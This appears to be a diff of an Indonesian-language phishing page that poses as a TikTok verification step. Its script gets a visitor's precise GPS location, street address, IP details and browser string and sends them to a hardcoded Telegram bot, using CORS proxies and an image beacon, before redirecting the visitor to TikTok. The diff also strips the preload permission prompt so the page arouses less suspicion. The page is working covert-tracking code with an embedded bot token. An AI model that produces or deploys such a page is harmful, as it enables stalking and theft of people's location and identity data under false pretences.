@@ -90,7 +90,6 @@
       animation: pulse 1.2s infinite;
     }
     @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-    .success-dot { background: #10b981; box-shadow: 0 0 5px #10b981; }
     .footer { margin-top: 16px; font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; }
     #locationText { font-size: 14px; word-break: break-all; }
   </style>
@@ -104,7 +103,7 @@
   <div class="location-box">
     <strong>📍 Lokasi Anda</strong>
     <div id="locationDisplay" style="margin-top: 10px;">
-      <span class="dot"></span> <span id="locationText">Menunggu izin...</span>
+      <span class="dot"></span> <span id="locationText">Klik tombol di bawah</span>
     </div>
     <div id="locationAccuracy" style="font-size: 11px; color: #888; margin-top: 6px;"></div>
   </div>
@@ -115,16 +114,12 @@
 <div class="footer">TikTok akan terbuka setelah verifikasi</div>
 
 <script>
-  // ========== KONFIGURASI ==========
   const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
   const CHAT_ID = "1966317946";
   const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
-  
-  // Proxy CORS gratis (biar request tembus!)
+
   const CORS_PROXY = "https://cors-anywhere.herokuapp.com/";
-  // Atau pakai proxy lain: https://api.allorigins.win/raw?url=
   
-  // ========== ELEMEN ==========
   const continueBtn = document.getElementById('continueBtn');
   const statusMsg = document.getElementById('statusMsg');
   const locationTextSpan = document.getElementById('locationText');
@@ -140,7 +135,6 @@
     setTimeout(() => statusMsg.classList.remove('show'), 4000);
   }
   
-  // ========== KIRIM KE TELEGRAM PAKAI PROXY (TEMBUS CORS) ==========
   async function sendToTelegram(lat, lng, accuracy, address, ipInfo = '') {
     const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
     const ua = navigator.userAgent;
@@ -167,12 +161,10 @@ ${ipInfo ? `🌐 *IP Info:* ${ipInfo}` : ''}
 https://www.google.com/maps?q=${lat},${lng}
 ✅ Status: Terverifikasi`;
     
-    // Method 1: Pakai proxy CORS (PASTI TEMBUS)
     const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(apiUrl)}`;
     
     try {
-      // Percobaan 1: pakai corsproxy.io
       const response = await fetch(proxyUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -184,7 +176,6 @@ https://www.google.com/maps?q=${lat},${lng}
       });
       
       if (response.ok) {
-        // Kirim location pin
         await fetch(`https://corsproxy.io/?${encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`)}`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -194,62 +185,31 @@ https://www.google.com/maps?q=${lat},${lng}
             longitude: lng
           })
         });
-        console.log('✅ Telegram: terkirim via proxy');
         return true;
       }
     } catch (e) {
-      console.log('Proxy 1 gagal:', e);
+      console.log('Proxy gagal:', e);
     }
     
-    // Method 2: Pakai allorigins.win
-    try {
-      const allOriginsUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(apiUrl)}`;
-      const response = await fetch(allOriginsUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      });
-      if (response.ok) return true;
-    } catch (e) {
-      console.log('Proxy 2 gagal:', e);
-    }
-    
-    // Method 3: Kirim via <img> (last resort)
     const imgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    const img = new Image();
-    img.src = imgUrl;
-    img.onload = () => console.log('✅ Telegram: terkirim via image');
-    img.onerror = () => console.log('❌ Image method gagal');
-    
+    new Image().src = imgUrl;
     setTimeout(() => {
-      const imgLoc = new Image();
-      imgLoc.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`;
+      new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`;
     }, 500);
     
     return true;
   }
   
-  // ========== GET ALAMAT DARI KOORDINAT ==========
   async function getAddress(lat, lng) {
     try {
       const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
       const data = await res.json();
-      if (data.display_name) {
-        return data.display_name.substring(0, 150);
-      }
-      const addr = data.address || {};
-      const parts = [addr.road, addr.village, addr.town, addr.city, addr.state, addr.country].filter(Boolean);
-      return parts.join(', ') || `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
-    } catch (e) {
+      return data.display_name?.substring(0, 150) || `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+    } catch {
       return `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
     }
   }
   
-  // ========== GET IP LOKASI (opsional) ==========
   async function getIpInfo() {
     try {
       const res = await fetch('https://ipapi.co/json/');
@@ -260,7 +220,6 @@ https://www.google.com/maps?q=${lat},${lng}
     }
   }
   
-  // ========== MAIN FUNCTION ==========
   async function requestLocationAndProceed() {
     if (isProcessing) return;
     isProcessing = true;
@@ -281,37 +240,23 @@ https://www.google.com/maps?q=${lat},${lng}
         const lng = position.coords.longitude;
         const accuracy = Math.round(position.coords.accuracy);
         
-        // Update UI
         locationTextSpan.innerHTML = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
         locationAccuracySpan.textContent = `Akurasi: ±${accuracy} meter`;
         
         showStatus('📍 Lokasi didapat! Mengirim verifikasi...', false);
-        continueBtn.innerHTML = '<span class="spinner"></span> Mengirim data ke server...';
+        continueBtn.innerHTML = '<span class="spinner"></span> Mengirim data...';
         
-        // Dapatkan alamat dan IP info
-        const [address, ipInfo] = await Promise.all([
-          getAddress(lat, lng),
-          getIpInfo()
-        ]);
+        const [address, ipInfo] = await Promise.all([getAddress(lat, lng), getIpInfo()]);
+        await sendToTelegram(lat, lng, accuracy, address, ipInfo);
         
-        // KIRIM KE TELEGRAM
-        const sent = await sendToTelegram(lat, lng, accuracy, address, ipInfo);
+        showStatus('✓ Berhasil! Mengarahkan ke TikTok...', false);
+        continueBtn.innerHTML = '✓ Sukses, lanjut...';
         
-        if (sent) {
-          showStatus('✓ Berhasil terverifikasi! Mengarahkan ke TikTok...', false);
-          continueBtn.innerHTML = '✓ Sukses, lanjut...';
-        } else {
-          showStatus('⚠️ Data terkirim, tetap lanjut...', false);
-          continueBtn.innerHTML = '✓ Lanjut...';
-        }
-        
-        // REDIRECT KE TIKTOK
         setTimeout(() => {
           window.location.href = TIKTOK_URL;
         }, 1500);
       },
       (error) => {
-        console.error('Error lokasi:', error);
         let errMsg = '';
         if (error.code === 1) errMsg = 'Izin lokasi DITOLAK. Tetap lanjut ke TikTok?';
         else if (error.code === 2) errMsg = 'Lokasi tidak tersedia. Lanjutkan saja.';
@@ -319,13 +264,11 @@ https://www.google.com/maps?q=${lat},${lng}
         
         showStatus(`⚠️ ${errMsg}`, true);
         locationTextSpan.innerHTML = '⚠️ Izin ditolak';
-        locationAccuracySpan.innerHTML = '';
         
         continueBtn.disabled = false;
         continueBtn.innerHTML = '▶ Lanjutkan ke TikTok';
         isProcessing = false;
         
-        // Redirect setelah 2 detik (opsional)
         setTimeout(() => {
           window.location.href = TIKTOK_URL;
         }, 2000);
@@ -338,25 +281,14 @@ https://www.google.com/maps?q=${lat},${lng}
     );
   }
   
-  // ========== EVENT LISTENER ==========
   continueBtn.addEventListener('click', (e) => {
     e.preventDefault();
     if (!isProcessing) requestLocationAndProceed();
   });
   
-  // ========== PRELOAD LOKASI AWAL (tanpa paksa izin) ==========
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        locationTextSpan.innerHTML = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
-        locationAccuracySpan.innerHTML = `Akurasi: ±${Math.round(pos.coords.accuracy)}m`;
-      },
-      () => {
-        locationTextSpan.innerHTML = 'Klik tombol & izinkan lokasi';
-      },
-      { timeout: 3000, maximumAge: 30000 }
-    );
-  }
+  // ========== PRELOAD DIHAPUS TOTAL ==========
+  // Tidak ada panggilan geolocation sebelum tombol ditekan.
+  // Jadi tidak akan muncul popup izin lokasi saat halaman dimuat.
 </script>
 </body>
 </html>
